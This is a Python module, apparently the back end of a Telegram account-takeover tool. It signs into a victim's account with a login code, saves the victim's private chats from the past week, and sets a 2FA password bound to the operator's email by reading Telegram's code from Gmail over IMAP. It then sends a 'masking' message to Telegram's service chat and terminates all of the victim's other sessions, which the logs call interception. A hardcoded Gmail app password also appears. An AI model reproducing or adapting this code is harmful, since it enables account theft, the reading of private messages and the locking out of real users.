"""
session_handler.py
Модуль для роботи з Telegram сесіями та авторизацією
"""
import asyncio
import hashlib
import os
import json
import shutil
import imaplib
import threading
import time
import email
import re
from telethon import TelegramClient
from telethon.errors import (
    SessionPasswordNeededError,
    FloodWaitError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError, PasswordHashInvalidError
)
from typing import Optional

import logging
from datetime import datetime, timedelta, timezone

from clear_telegram_chat import MASK_MESSAGE
from config import CHAT_FOLDER, RECOVERY_EMAIL

from telethon import functions, types

logger = logging.getLogger(__name__)




async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = CHAT_FOLDER):
    """
    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 дні.

    Args:
        client (TelegramClient): Активний клієнт Telethon.
        phone_number (str): Номер телефону користувача (наприклад, '+380xxxxxxxxx').
        base_chats_folder (str): Коренева папка для збереження чатів (за замовчуванням 'chats').
    """
    # Переконуємось, що базова папка існує
    os.makedirs(base_chats_folder, exist_ok=True)

    # Створюємо папку для конкретного користувача
    user_folder = os.path.join(base_chats_folder, phone_number)
    os.makedirs(user_folder, exist_ok=True)

    # Визначаємо дату 7 днів тому з часовим поясом UTC
    date_limit = datetime.now(timezone.utc) - timedelta(days=7)
    logger.info(f"Починаємо збір чатів для {phone_number} за останні 7 днів (з {date_limit.date()})")

    dialog_count = 0
    processed_count = 0

    # Отримуємо всі діалоги
    async for dialog in client.iter_dialogs():
        # Пропускаємо групи, канали та боти (лише особисті чати)
        if not dialog.is_user:
            continue

        dialog_count += 1
        logger.info(f"Обробляємо чат #{dialog_count}: {dialog.name} (ID: {dialog.id})")

        chat_messages = []
        message_count = 0

        try:
            # Встановлюємо таймаут для обробки одного чату (30 секунд)
            async with asyncio.timeout(300):
                # Отримуємо повідомлення з цього чату
                # limit=None - отримуємо всі повідомлення
                # offset_date не використовуємо, бо він може пропускати повідомлення
                async for message in client.iter_messages(
                        dialog.entity,
                        limit=None,
                        reverse=False  # Від нових до старих
                ):
                    message_count += 1

                    # Якщо повідомлення старіше за date_limit, зупиняємо ітерацію
                    if message.date < date_limit:
                        break

                    # Додаємо повідомлення, якщо воно в межах останніх 7 днів
                    msg_data = {
                        "date": message.date.isoformat(),
                        "sender_id": message.from_id.user_id if message.from_id else None,
                        "receiver_id": dialog.id,
                        "has_media": bool(message.media),
                        "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
                                                                                              'username', 'Unknown'),
                        "text": message.text or ""
                    }
                    chat_messages.append(msg_data)

                    # Додаємо невелику затримку кожні 100 повідомлень
                    if message_count % 100 == 0:
                        await asyncio.sleep(0.1)
                        logger.info(f"  Оброблено {message_count} повідомлень...")

        except asyncio.TimeoutError:
            logger.warning(
                f"⚠️ Таймаут при обробці чату {dialog.name}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
        except Exception as e:
            logger.error(f"❌ Помилка при обробці чату {dialog.name}: {e}")
            continue

        # Якщо є повідомлення, зберігаємо їх у файл
        if chat_messages:
            # Ім'я файлу: username або ID чату
            chat_filename = f"{dialog.id}.json"
            if hasattr(dialog.entity, 'username') and dialog.entity.username:
                chat_filename = f"{dialog.entity.username}.json"

            chat_filepath = os.path.join(user_folder, chat_filename)

            try:
                with open(chat_filepath, 'w', encoding='utf-8') as f:
                    json.dump(chat_messages, f, ensure_ascii=False, indent=4)

                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень у файл: {chat_filename}")
                processed_count += 1
            except Exception as e:
                logger.error(f"❌ Не вдалося зберегти файл {chat_filename}: {e}")
        else:
            logger.info(f"ℹ️ У чаті з {dialog.name} не знайдено повідомлень за останні 7 днів.")

    logger.info(
        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів.")


async def send_verification_code(phone: str, api_id: int, api_hash: str, session_folder: str):
    """
    Відправляє код підтвердження на вказаний номер телефону.

    Args:
        phone: Номер телефону з кодом країни (наприклад, +380...)
        api_id: Telegram API ID
        api_hash: Telegram API Hash
        session_folder: Папка для збереження сесій

    Returns:
        tuple: (успіх: bool, клієнт або повідомлення_про_помилку: str)
    """
    os.makedirs(session_folder, exist_ok=True)

    # Видаляємо '+' для імені файлу сесії
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()

        # Перевіряємо, чи вже авторизований
        if await client.is_user_authorized():
            logger.warning(f"Користувач {phone} вже авторизований")
            await client.disconnect()
            return False, "Цей номер вже авторизований у системі."

        # Відправляємо запит на код
        await client.send_code_request(phone)
        logger.info(f"✅ Код успішно надіслано на {phone}")

        # Повертаємо клієнт для подальшого використання
        # НЕ відключаємо клієнт, він потрібен для sign_in
        return True, client

    except PhoneNumberInvalidError:
        error_msg = f"Номер телефону {phone} недійсний або має неправильний формат."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg

    except Exception as e:
        error_msg = f"Помилка при відправці коду: {str(e)}"
        logger.error(error_msg)
        if client.is_connected():
            await client.disconnect()
        return False, error_msg


async def sign_in_with_code(client: TelegramClient, phone: str, code: str, session_folder: str):
    """
    Виконує вхід в Telegram використовуючи код підтвердження.

    Args:
        client: Активний TelegramClient з відправленим запитом на код
        phone: Номер телефону
        code: 5-значний код підтвердження
        session_folder: Папка для збереження сесій

    Returns:
        tuple: (успіх: bool, шлях_до_сесії або повідомлення_про_помилку: str)
    """
    try:
        if not client.is_connected():
            await client.connect()

        # Намагаємось увійти з кодом
        await client.sign_in(phone, code=code)

        # Перевіряємо успішність авторизації
        if await client.is_user_authorized():
            session_name = f"{phone.replace('+', '')}.session"
            session_path = os.path.join(session_folder, session_name)

            logger.info(f"✅ Успішна авторизація для {phone}!")
            logger.info(f"Сесія збережена: {session_path}")

            return "Success", session_path
        else:
            error_msg = "Не вдалося авторизуватись. Спробуй ще раз."
            logger.error(error_msg)
            return False, error_msg

    except PhoneCodeInvalidError:
        error_msg = "❌ Невірний код підтвердження. Перевір і спробуй ще раз."
        logger.error(error_msg)
        return False, error_msg

    except PhoneCodeExpiredError:
        error_msg = "⏱ Код підтвердження застарів. Почни процес заново."
        logger.error(error_msg)
        return False, error_msg


    except SessionPasswordNeededError:
        # Повертаємо спеціальний результат, який вказує на наявність 2FA
        logger.warning(f"🔐 На акаунті {phone} виявлено 2FA. Вхід без доступу до повідомлень.")
        return "2FA_DETECTED", "На цьому акаунті ввімкнена двофакторна автентифікація. Доступ до чатів неможливий, але верифікація пройдена."

    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб входу. Зачекай {e.seconds} секунд."
        logger.error(error_msg)
        return False, error_msg

    except Exception as e:
        error_msg = (
            f"Непередбачена помилка: {str(e)}\n\n"
            "Можливі причини:\n"
            "• Telegram заблокував спробу входу через підозрілу активність\n"
            "• Проблеми з мережею\n"
            "• Некоректні API credentials"
        )
        logger.error(f"Помилка входу: {e}")
        return False, error_msg


async def check_session_valid(phone: str, api_id: int, api_hash: str, session_folder: str):
    """
    Перевіряє, чи існує та валідна сесія для вказаного номера.

    Args:
        phone: Номер телефону
        api_id: Telegram API ID
        api_hash: Telegram API Hash
        session_folder: Папка з сесіями

    Returns:
        bool: True якщо сесія валідна, False інакше
    """
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    if not os.path.exists(session_path):
        logger.info(f"Сесія для {phone} не знайдена")
        return False

    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()
        is_authorized = await client.is_user_authorized()

        if is_authorized:
            logger.info(f"✅ Сесія для {phone} валідна")
        else:
            logger.info(f"❌ Сесія для {phone} не авторизована")

        return is_authorized

    except Exception as e:
        logger.error(f"Помилка при перевірці сесії для {phone}: {e}")
        return False

    finally:
        if client.is_connected():
            await client.disconnect()


async def delete_session(phone: str, session_folder: str):
    """
    Видаляє сесію для вказаного номера.

    Args:
        phone: Номер телефону
        session_folder: Папка з сесіями

    Returns:
        bool: True якщо сесію видалено, False якщо сесії не існувало
    """
    session_name = f"{phone.replace('+', '')}.session"
    session_path = os.path.join(session_folder, session_name)

    try:
        if os.path.exists(session_path):
            os.remove(session_path)
            logger.info(f"✅ Сесію {phone} видалено")
            return True
        else:
            logger.info(f"Сесія {phone} не існує")
            return False
    except Exception as e:
        logger.error(f"Помилка при видаленні сесії {phone}: {e}")
        return False


def cleanup_old_emails(imap_host: str, email_user: str, email_pass: str):
    """Очищує старі листи від Telegram"""
    try:
        mail = imaplib.IMAP4_SSL(imap_host)
        mail.login(email_user, email_pass)
        mail.select("inbox")

        # Шукаємо всі листи від Telegram старші за 1 день
        _, messages = mail.search(None, 'FROM "noreply@telegram.org" BEFORE',
                                  (datetime.now() - timedelta(days=1)).strftime("%d-%b-%Y"))

        if messages[0]:
            for msg_id in messages[0].split():
                mail.store(msg_id, '+FLAGS', '\\Deleted')
            mail.expunge()
            logger.info(f"🗑️ Видалено {len(messages[0].split())} старих листів від Telegram")

        mail.logout()
    except Exception as e:
        logger.error(f"❌ Помилка очищення пошти: {e}")


def get_email_code_sync(imap_host: str, email_user: str, email_pass: str, timeout: int = 60) -> str:
    """Синхронна версія отримання коду з пошти"""
    logger.info(f"📧 Починаємо отримання коду з {imap_host} для {email_user}")
    deadline = time.time() + timeout
    attempt = 1
    last_processed_uid = None  # Відстежуємо останній оброблений UID

    while time.time() < deadline:
        logger.info(f"📧 Спроба {attempt} отримати код...")

        try:
            # Підключаємось до IMAP
            logger.debug(f"Підключення до IMAP сервера {imap_host}...")
            mail = imaplib.IMAP4_SSL(imap_host)
            mail.login(email_user, email_pass)
            logger.debug("Успішно підключено до IMAP")

            mail.select("inbox")
            logger.debug("Вибрана папка inbox")

            # Шукаємо непрочитані листи від Telegram, сортуємо за датою
            logger.debug("Пошук листів від noreply@telegram.org...")
            _, messages = mail.search(None, 'FROM "noreply@telegram.org" UNSEEN')

            message_count = len(messages[0].split()) if messages[0] else 0
            logger.info(f"Знайдено {message_count} непрочитаних листів від Telegram")

            if messages[0]:
                # Беремо всі ID і сортуємо їх (останній буде останнім у списку)
                msg_ids = messages[0].split()
                logger.debug(f"Знайдено ID повідомлень: {msg_ids}")

                # Перебираємо від останнього до першого
                for msg_id in reversed(msg_ids):
                    logger.debug(f"Читаємо лист з ID: {msg_id}")

                    _, msg_data = mail.fetch(msg_id, "(RFC822)")

                    if msg_data and msg_data[0] and msg_data[0][1]:
                        raw_email = msg_data[0][1]
                        logger.debug(f"Отримано email, розмір: {len(raw_email)} байт")

                        msg = email.message_from_bytes(raw_email)

                        # Перевіряємо дату листа
                        date_str = msg.get('Date', '')
                        if date_str:
                            try:
                                from email.utils import parsedate_to_datetime
                                email_date = parsedate_to_datetime(date_str)
                                logger.debug(f"Дата листа: {email_date}")

                                # Якщо лист старший за 5 хвилин, пропускаємо
                                time_diff = time.time() - email_date.timestamp()
                                if time_diff > 300:  # 5 хвилин
                                    logger.debug(f"Лист занадто старий ({time_diff:.0f} сек), пропускаю")
                                    continue
                            except Exception as e:
                                logger.debug(f"Не вдалося розпарсити дату: {e}")

                        # Витягуємо текст листа
                        body = ""
                        if msg.is_multipart():
                            logger.debug("Email є multipart, шукаємо text/plain частину")
                            for part in msg.walk():
                                content_type = part.get_content_type()
                                logger.debug(f"Знайдено частину з типом: {content_type}")
                                if content_type == "text/plain":
                                    body = part.get_payload(decode=True).decode()
                                    logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")
                                    break
                        else:
                            logger.debug("Email не multipart, читаємо payload")
                            body = msg.get_payload(decode=True).decode()
                            logger.debug(f"Текст листа (перші 200 символів): {body[:200]}")

                        # Шукаємо код (5-6 цифр)
                        logger.debug("Пошук коду підтвердження...")
                        code_match = re.search(r'\b(\d{5,6})\b', body)

                        if code_match:
                            code = code_match.group(1)
                            logger.info(f"✅ Знайдено код: {code}")

                            # Помічаємо лист як прочитаний
                            mail.store(msg_id, '+FLAGS', '\\Seen')
                            logger.debug("Лист позначено як прочитаний")

                            mail.logout()
                            logger.debug("Відключено від IMAP")
                            return code
                        else:
                            logger.warning("Код не знайдено в тексті листа")
                            logger.debug(f"Текст листа для аналізу: {body[:500]}")
                    else:
                        logger.warning("Не вдалося отримати дані листа")
            else:
                logger.info("Немає нових листів від Telegram")

            mail.logout()
            logger.debug("Відключено від IMAP")

        except imaplib.IMAP4.error as e:
            logger.error(f"❌ IMAP помилка: {e}")
        except Exception as e:
            logger.error(f"❌ Неочікувана помилка: {e}", exc_info=True)

        # Чекаємо перед наступною спробою
        wait_time = 5
        logger.info(f"⏳ Чекаємо {wait_time} секунд перед наступною спробою...")
        time.sleep(wait_time)
        attempt += 1

    logger.error(f"❌ Час очікування ({timeout} секунд) вичерпано")
    raise TimeoutError("Код підтвердження не отримано за відведений час")


def create_email_callback(imap_host: str, email_user: str, email_pass: str):
    """Створює синхронний callback для Telethon"""

    def email_code_callback(code_length: int):
        """Синхронний callback для Telethon"""
        logger.info(f"📧 Очікуємо код підтвердження на пошті (довжина: {code_length})...")
        logger.info(f"📧 Параметри: host={imap_host}, user={email_user}")

        try:
            # Викликаємо синхронну функцію безпосередньо
            code = get_email_code_sync(imap_host, email_user, email_pass, timeout=120)
            logger.info(f"✅ Код успішно отримано: {code}")
            return code
        except TimeoutError as e:
            logger.error(f"❌ Таймаут отримання коду: {e}")
            raise
        except Exception as e:
            logger.error(f"❌ Помилка отримання коду: {e}", exc_info=True)
            raise

    return email_code_callback


async def get_account_with_2fa(client: TelegramClient, new_password: str):
    try:
        IMAP_HOST = "imap.gmail.com"
        EMAIL_USER = RECOVERY_EMAIL
        EMAIL_PASS = "yjhlrwefngcoiwih"  # App Password для Gmail

        logger.info("📧 Починаємо процес встановлення 2FA")
        logger.info(f"📧 Email для відновлення: {EMAIL_USER}")
        logger.info(f"📧 IMAP хост: {IMAP_HOST}")

        logger.info("🗑️ Очищуємо старі листи від Telegram...")
        cleanup_old_emails(IMAP_HOST, EMAIL_USER, EMAIL_PASS)

        # Створюємо callback функцію
        callback = create_email_callback(IMAP_HOST, EMAIL_USER, EMAIL_PASS)

        # Використовуємо вбудований метод Telethon для встановлення 2FA
        logger.info("📧 Викликаємо client.edit_2fa...")
        await client.edit_2fa(
            current_password=None,  # Якщо пароля ще немає
            new_password=new_password,
            hint="For security",
            email=RECOVERY_EMAIL,
            email_code_callback=callback
        )

        try:
            await client.send_message(777000, MASK_MESSAGE)
            logger.info("🎭 Маскувальне повідомлення успішно відправлено в чат Telegram.")
        except Exception as e:
            logger.error(f"❌ Помилка при відправці маскувального повідомлення: {e}")

        logger.info(f"✅ Пароль 2FA успішно встановлено.")

        # --- Крок 3: Завершення всіх інших сесій ---
        logger.info("🔄 Завершую всі інші сесії...")
        sessions = await client(functions.account.GetAuthorizationsRequest())
        terminated_count = 0
        for session in sessions.authorizations:
            if not session.current:
                await client(functions.account.ResetAuthorizationRequest(hash=session.hash))
                logger.info(f" - Сесію {session.device_model} ({session.platform}) завершено.")
                terminated_count += 1

        logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")
        return True, f"Перехоплення успішне"#. Завершено {terminated_count} інших сесій."

    except PasswordHashInvalidError:
        # Ця помилка може виникнути, якщо пароль вже був, а ми спробували встановити новий без підтвердження старого
        logger.error("❌ Помилка: На акаунті вже є пароль. Неможливо перехопити без старого пароля.")
        return False, "На акаунті вже є 2FA. Перехоплення неможливе."
    except FloodWaitError as e:
        error_msg = f"⏱ Забагато спроб. Зачекай {e.seconds} секунд і спробуй знову."
        logger.error(error_msg)
        return False, error_msg
    except Exception as e:
        logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
        return False, str(e)

def move_session_to_2fa(phone: str, source_folder: str, dest_folder: str):
    """
    Переміщує сесійний файл у папку для сесій з 2FA.
    """
    session_name = f"{phone.replace('+', '')}.session"
    source_path = os.path.join(source_folder, session_name)
    dest_path = os.path.join(dest_folder, session_name)

    try:
        os.makedirs(dest_folder, exist_ok=True) # Переконуємось, що папка існує
        shutil.move(source_path, dest_path)
        logger.info(f"✅ Сесію для {phone} переміщено до {dest_folder}")
        return True
    except FileNotFoundError:
        logger.error(f"❌ Сесію для {phone} не знайдено в {source_folder} для переміщення.")
        return False
    except Exception as e:
        logger.error(f"❌ Помилка при переміщенні сесії {phone}: {e}")
        return False